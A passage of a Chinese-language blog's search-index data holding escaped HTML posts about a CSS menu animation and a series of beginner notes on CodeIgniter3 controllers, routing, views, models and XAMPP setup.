class=\"built_in\">translateY</span>(-4px);</span><br><span class=\"line\">        <span class=\"attribute\">transform</span>: <span class=\"built_in\">translateY</span>(-4px)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    100% &#123;</span><br><span class=\"line\">        <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">translateY</span>(0);</span><br><span class=\"line\">        <span class=\"attribute\">transform</span>: <span class=\"built_in\">translateY</span>(0)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">keyframes</span> menu-out-s &#123;</span><br><span class=\"line\">    0% &#123;</span><br><span class=\"line\">        <span class=\"attribute\">opacity</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">translateY</span>(0);</span><br><span class=\"line\">        <span class=\"attribute\">transform</span>: <span class=\"built_in\">translateY</span>(0);</span><br><span class=\"line\">        <span class=\"attribute\">-webkit-animation-timing-function</span>: <span class=\"built_in\">cubic-bezier</span>(.23, 1, .32, 1);</span><br><span class=\"line\">        <span class=\"attribute\">animation-timing-function</span>: <span class=\"built_in\">cubic-bezier</span>(.23, 1, .32, 1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    100% &#123;</span><br><span class=\"line\">        <span class=\"attribute\">opacity</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">translateY</span>(40px);</span><br><span class=\"line\">        <span class=\"attribute\">transform</span>: <span class=\"built_in\">translateY</span>(40px);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(1)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear <span class=\"number\">0s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear <span class=\"number\">0s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(2)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">05s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">05s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(3)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">1s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">1s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(4)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">15s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">15s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(5)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">2s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">2s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(6)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">25s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">25s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(7)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">3s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">3s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(8)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">35s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">35s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(9)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">4s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">4s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu</span><span class=\"selector-pseudo\">:nth-of-type(10)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">45s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-in-s .<span class=\"number\">4s</span> linear .<span class=\"number\">45s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(1)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">36s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">36s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(2)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">32s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">32s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(3)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">28s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">28s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(4)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">24s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">24s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(5)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">2s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">2s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(6)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">16s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">16s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(7)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">12s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">12s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(8)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">08s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">08s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(9)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">04s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear .<span class=\"number\">04s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span><span class=\"selector-pseudo\">:nth-of-type(10)</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-animation</span>: menu-out-s .<span class=\"number\">4s</span> linear <span class=\"number\">0s</span> <span class=\"number\">1</span> normal both;</span><br><span class=\"line\">    <span class=\"attribute\">animation</span>: menu-out-s .<span class=\"number\">4s</span> linear <span class=\"number\">0s</span> <span class=\"number\">1</span> normal both</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.header-menu-fadeout</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">pointer-events</span>: none;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'btn'</span>).addEventListener(<span class=\"string\">\"click\"</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"> <span class=\"built_in\">document</span>.querySelectorAll(<span class=\"string\">'.header-menu'</span>).forEach(<span class=\"function\">(<span class=\"params\">el</span>)=&gt;</span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">var</span> className = <span class=\"string\">\"header-menu-fadeout\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (el.classList) &#123;</span><br><span class=\"line\">  el.classList.toggle(className);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> classes = el.className.split(<span class=\"string\">' '</span>);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> existingIndex = classes.indexOf(className);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (existingIndex &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    classes.splice(existingIndex, <span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    classes.push(className);</span><br><span class=\"line\"></span><br><span class=\"line\">  el.className = classes.join(<span class=\"string\">' '</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><em>可用<code>event.preventDefault();</code>來解決a連結事件動作</em><br>css可用SASS用回圈寫<br><a class=\"jsbin-embed\" href=\"http://jsbin.com/zipavemefa/embed?html,js,output\" target=\"_blank\" rel=\"noopener\">JS Bin on jsbin.com</a><script src=\"http://static.jsbin.com/js/embed.min.js?4.0.4\"></script></p>\n","categories":["網頁特效"]},{"title":"CodeIgniter3 設定 Controllers","url":"/blog/2017/06/18/logdown/2017-06-18-1959613/","content":"<p>一直以為建立Controller一定要設定Router<br>我以為這是一定要的啦<br>但今天我看了官網文件<br>原來可以不用做XD<br><a href=\"https://codeigniter.org.tw/userguide3/general/controllers.html\" target=\"_blank\" rel=\"noopener\">https://codeigniter.org.tw/userguide3/general/controllers.html</a></p>\n<a id=\"more\"></a>\n<p><strong>檔案一定要被命名為 ‘Blog.php’，第一個字母必須大寫 ‘B’。<br>類別名稱必須以大寫字母開頭。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">public function __construct()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        parent::__construct();</span><br><span class=\"line\">        // Your own constructor code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>這一句一定要貼到你的Controller裡面</p>\n<p>我覺得比較有趣的是<br>Controller還可以放在資料夾裡面<br>例如<code>controller/users/user.php</code>網址可以輸入<code>http://localhost/ci3/user/test2fff</code></p>\n<p>_remap好像照uri重新對印method</p>\n<p>_remap,output目前還不知道能運用在哪些地方</p>\n<p>此篇筆記到這<br>`php<br>&lt;?php if ( ! defined(‘BASEPATH’)) exit(‘No direct script access allowed’);</p>\n<p>class User extends CI_Controller {</p>\n<pre><code>public function __construct()\n{\n    parent::__construct();\n}\n\npublic function index()\n{\n    echo &quot;Hello World&quot;;\n}\n\npublic function index2()\n{\n    echo &quot;Hello World2&quot;;\n}\n\npublic function index3($a1,$a2)\n{\n    echo &quot;Hello World:&quot; . $a1 . $a2;\n}\n\npublic function _remap($method)\n{\n        if ($method === &apos;index2&apos;)\n        {\n                $this-&gt;$method();\n        }\n        else\n        {\n                $this-&gt;index();\n        }\n}\n\n\npublic function _output($output)\n{\n        echo $output.&apos;ffff&apos;;\n}\n\nprivate function _test()\n{\n    echo &apos;test&apos;;\n}\n</code></pre><p>}<br>/<em> End of file User.php </em>/<br>/<em> Location: ./application/controllers/User.php </em>/<br>`</p>\n","categories":["CodeIgniter3"],"tags":["PHP","CodeIgniter3","Controllers"]},{"title":"CodeIgniter3 設定 Router","url":"/blog/2017/06/18/logdown/2017-06-18-1959505/","content":"<p><code>routes.php</code>可以設定CodeIgniter路由<br>這邊是設定所有路由<br>好像跟Rails設定方法有點不太一樣<br>不過也滿好懂的</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$route[&apos;default_controller&apos;] = &apos;welcome&apos;;</span><br><span class=\"line\">$route[&apos;404_override&apos;] = &apos;&apos;;</span><br><span class=\"line\">$route[&apos;translate_uri_dashes&apos;] = FALSE;</span><br></pre></td></tr></table></figure>\n<p>預設導置Controller的Welcome.php那隻(PS:Contoller規定一開始要大寫)<br> ‘welcome’ 後面method沒寫，就是導置<code>welcome/index</code></p>\n<p> 當上面條件抓到，就會馬上導到Contoller<br> 所以上下規則還算滿重要的</p>\n<p> 官網這篇寫的還滿清楚的<br> <a href=\"https://codeigniter.org.tw/userguide3/general/routing.html\" target=\"_blank\" rel=\"noopener\">https://codeigniter.org.tw/userguide3/general/routing.html</a></p>\n<blockquote>\n<p>(:num) 將匹配只含有數字的一個片段。 (:any) 將匹配含有任何字元的一個片段（除了 ‘/’，這是區段界定符號）。<br>萬用字元實際上是正規表達式的別名， :any 被翻譯成 [^/]+ 以及 :num 被翻譯成 [0-9]+ 。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$route[&apos;login/(.+)&apos;] = &apos;auth/login/$1&apos;;</span><br><span class=\"line\">$route[&apos;login/(:any)&apos;] = &apos;auth/login/$1&apos;;</span><br></pre></td></tr></table></figure>\n<p>簡單可以用正規化來定義路由設定</p>\n<p>#路由中使用 HTTP 動詞</p>\n<blockquote>\n<p>例如：<br>$route[‘products’][‘put’] = ‘product/insert’;<br>上述例子，PUT 請求到 URI“products” 稱之為 Product::insert() 控制器方法。<br>$route[‘products/(:num)’][‘DELETE’] = ‘product/delete/$1’;<br>DELETE 請求到 URL“products”第一個片段，數字在第二個片段將會重新映射到 Product::delete() 方法，傳入數值到第一個參數上。<br>使用 HTTP 動詞當然是可選的（非必要）。</p>\n</blockquote>\n<p>還有此功能，有空來試試吧:P</p>\n","categories":["CodeIgniter3"],"tags":["PHP","CodeIgniter3","routes"]},{"title":"CodeIgniter3 設定 View","url":"/blog/2017/06/18/logdown/2017-06-18-1959863/","content":"<p>曾經看過一個文<br>他說php本身就是樣版引擎<br>不需要特別載入</p>\n<p>之前有用過twig簡單的樣版引擎<br>CoeIgniter本身就是用php<br>當然也可以使用自己最愛用的</p>\n<a id=\"more\"></a>\n<p><a href=\"https://codeigniter.org.tw/userguide3/general/views.html\" target=\"_blank\" rel=\"noopener\">https://codeigniter.org.tw/userguide3/general/views.html</a></p>\n<p>載入<code>$this-&gt;load-&gt;view(&#39;name&#39;);</code>在Controller特別簡單<br>沒有什麼難度XD</p>\n<p>#動態資料載入到 View</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$data = array(</span><br><span class=\"line\">        &apos;title&apos; =&gt; &apos;My Title&apos;,</span><br><span class=\"line\">        &apos;heading&apos; =&gt; &apos;My Heading&apos;,</span><br><span class=\"line\">        &apos;message&apos; =&gt; &apos;My Message&apos;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">$this-&gt;load-&gt;view(&apos;blogview&apos;, $data);</span><br><span class=\"line\"></span><br><span class=\"line\">//然後這裡是運用物件的方法傳入：</span><br><span class=\"line\">$data = new Someclass();</span><br><span class=\"line\">$this-&gt;load-&gt;view(&apos;blogview&apos;, $data);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果你是用物件，類別變數將會被轉成陣列元素。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;&lt;?=title?&gt;&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;&lt;?=heading?&gt;&lt;/h1&gt;</span><br><span class=\"line\">&lt;?=message?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>跟Controller可以放在資料夾裡面<br><code>$this-&gt;load-&gt;view(&#39;directory_name/file_name&#39;);</code></p>\n<p>看到官方View比較特別的寫法<a href=\"https://codeigniter.org.tw/userguide3/general/alternative_php.html\" target=\"_blank\" rel=\"noopener\">https://codeigniter.org.tw/userguide3/general/alternative_php.html</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">        &lt;title&gt;&lt;?php echo $title;?&gt;&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">        &lt;h1&gt;&lt;?php echo $heading;?&gt;&lt;/h1&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;h3&gt;My Todo List&lt;/h3&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;ul&gt;</span><br><span class=\"line\">        &lt;?php foreach ($todo_list as $item):?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">                &lt;li&gt;&lt;?php echo $item;?&gt;&lt;/li&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;?php endforeach;?&gt;</span><br><span class=\"line\">        &lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>這段<code>foreach ($todo_list as $item):</code>頭，<code>endforeach;</code>尾<br>老實說這樣寫View會比較好看，但可能要花一段時間習慣他</p>\n<p><code>$string = $this-&gt;load-&gt;view(&#39;myfile&#39;, &#39;&#39;, TRUE);</code><br>就跟<code>$string = var_dump($a, TRUE );</code>和<code>$string  = print_r($a,TRUE )</code>做一樣事情</p>\n<p>CI3不知道為什麼，log_message不能放Object進去<br>不然會被卡入….</p>\n<p>VIEW這篇還滿簡單的，有基處PHP看一下應該就會用了吧。</p>\n","categories":["CodeIgniter3"],"tags":["PHP","CodeIgniter3","View"]},{"title":"CodeIgniter3 設定 Model","url":"/blog/2017/06/18/logdown/2017-06-18-1959922/","content":"<p>其實這篇寫的是Model…<br>但我覺得我寫的最多應該會是DB Driver Reference<br><a href=\"https://codeigniter.org.tw/userguide3/database/db_driver_reference.html?highlight=insert\" target=\"_blank\" rel=\"noopener\">https://codeigniter.org.tw/userguide3/database/db_driver_reference.html?highlight=insert</a></p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">class news_m extends CI_Model &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct() &#123;</span><br><span class=\"line\">        parent::__construct();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function getData($id = &apos;&apos;) &#123;</span><br><span class=\"line\">        if ($id == &apos;&apos;):</span><br><span class=\"line\">            return $this-&gt;db-&gt;get(&apos;news&apos;);//SELECT * FROM news</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return $this-&gt;db-&gt;where(&apos;id&apos;, $id)-&gt;get(&apos;news&apos;);</span><br><span class=\"line\">        endif;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function insert($post) &#123;</span><br><span class=\"line\">        $this-&gt;db-&gt;insert(&apos;news&apos;, $post);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function update($post) &#123;</span><br><span class=\"line\">        $this-&gt;db-&gt;where(&apos;id&apos;, $post[&apos;id&apos;])-&gt;update(&apos;news&apos;, $post);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function delete($id) &#123;</span><br><span class=\"line\">        $this-&gt;db-&gt;where(&apos;id&apos;, $id)-&gt;delete(&apos;news&apos;);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>","categories":["CodeIgniter3"],"tags":["PHP","CodeIgniter3","Model"]},{"title":"在Window用XAMPP架CodeIgniter3","url":"/blog/2017/06/18/logdown/2017-06-18-in-xampp-for-window-codeigniter3/","content":"<p>最近有在學CodeIgniter3，想說再不敢快作筆記<br>會忘了特別快，雖然採用快速架站的XAMPP來架<br>但也有遇到一點點問題<br>在此做一下筆記</p>\n<a id=\"more\"></a>\n<p>下載XAMPP解壓縮到你要裝的地方<br>再來<code>setup_xampp.bat</code>他會對XAMPP做設定<br>然後就可以啟用<code>xampp-control.exe</code></p>\n<p>再這之前<br>在把CodeIgniter3丟到htdocs目錄下<br>打開瀏覽器<code>http://localhost/ci3</code>(PS:我資料夾改成ci3)<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Welcome to CodeIgniter!</span><br><span class=\"line\"></span><br><span class=\"line\">The page you are looking at is being generated dynamically by CodeIgniter.</span><br><span class=\"line\"></span><br><span class=\"line\">If you would like to edit this page you&apos;ll find it located at:</span><br><span class=\"line\">application/views/welcome_message.php</span><br><span class=\"line\"></span><br><span class=\"line\">The corresponding controller for this page is found at:</span><br><span class=\"line\">application/controllers/Welcome.php</span><br><span class=\"line\"></span><br><span class=\"line\">If you are exploring CodeIgniter for the very first time, you should start by reading the User Guide.</span><br></pre></td></tr></table></figure></p>\n<p>看到這個畫面就成功了</p>\n<p>接下來我們要去設定DB設定</p>\n<p>首先去config.php把database啟用<br><code>$autoload[&#39;libraries&#39;] = array(&#39;database&#39;);</code><br>通常session也滿常用的，通常我也會順便啟用session<br><code>$autoload[&#39;libraries&#39;] = array(&#39;database&#39;,&#39;session&#39;);</code></p>\n<p>這個也滿常用的<br><code>$autoload[&#39;helper&#39;] = array(&#39;url&#39;);</code></p>\n<p>接下來就是設定database.php<br>預設XAMPP沒有設定root帳號、密碼<br>但我這邊就不設定，正式還境通常要設定喔</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$db[<span class=\"string\">'default'</span>] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">\t<span class=\"string\">'dsn'</span>\t=&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">\t<span class=\"string\">'hostname'</span> =&gt; <span class=\"string\">'localhost'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'username'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">\t<span class=\"string\">'password'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">\t<span class=\"string\">'database'</span> =&gt; <span class=\"string\">'test'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'dbdriver'</span> =&gt; <span class=\"string\">'mysqli'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'dbprefix'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">\t<span class=\"string\">'pconnect'</span> =&gt; <span class=\"keyword\">FALSE</span>,</span><br><span class=\"line\">\t<span class=\"string\">'db_debug'</span> =&gt; (ENVIRONMENT !== <span class=\"string\">'production'</span>),</span><br><span class=\"line\">\t<span class=\"string\">'cache_on'</span> =&gt; <span class=\"keyword\">FALSE</span>,</span><br><span class=\"line\">\t<span class=\"string\">'cachedir'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">\t<span class=\"string\">'char_set'</span> =&gt; <span class=\"string\">'utf8'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'dbcollat'</span> =&gt; <span class=\"string\">'utf8_general_ci'</span>,</span><br><span class=\"line\">\t<span class=\"string\">'swap_pre'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">\t<span class=\"string\">'encrypt'</span> =&gt; <span class=\"keyword\">FALSE</span>,</span><br><span class=\"line\">\t<span class=\"string\">'compress'</span> =&gt; <span class=\"keyword\">FALSE</span>,</span><br><span class=\"line\">\t<span class=\"string\">'stricton'</span> =&gt; <span class=\"keyword\">FALSE</span>,</span><br><span class=\"line\">\t<span class=\"string\">'failover'</span> =&gt; <span class=\"keyword\">array</span>(),</span><br><span class=\"line\">\t<span class=\"string\">'save_queries'</span> =&gt; <span class=\"keyword\">TRUE</span></span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>再開瀏覽器<code>http://locahost/ci3</code>，顯示正常<br>這樣架設就算完成</p>\n<p>有時你ci3不是載在第一層目錄<br>請記得照下面設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RewriteEngine On</span><br><span class=\"line\">RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class=\"line\">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class=\"line\">RewriteRule ^(.*)$ /(目錄path)/index.php/$1 [L]</span><br></pre></td></tr></table></figure></p>\n","categories":["CodeIgniter"],"tags":["PHP","CodeIgniter","XAMPP"]},{"title":"flex遇到float","url":"/blog/2017/07/02/logdown/2017-07-02-flex-meet-float/","content":"<p><a href=\"https://jsfiddle.net/nickday/fayzaew2/11/?utm_source=website&amp;utm_medium=embed&amp;utm_campaign=fayzaew2\" 